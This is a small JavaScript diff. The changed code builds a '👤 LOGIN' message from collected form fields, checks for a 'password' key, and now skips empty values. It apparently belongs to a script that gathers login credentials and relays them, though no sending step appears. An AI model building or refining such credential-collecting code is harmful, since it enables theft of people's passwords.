@@ -232,7 +232,7 @@ if (lowerCaseMyObjects.includes('password')) {
                `👤 LOGIN \n\n`;
 
     for (const key of myObjects) {
-        if (key.toLowerCase() !== 'visitor') {
+        if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
             console.log(`${key}: ${myObject[key]}`);
             message += `${key}: ${myObject[key]}\n`;
         }
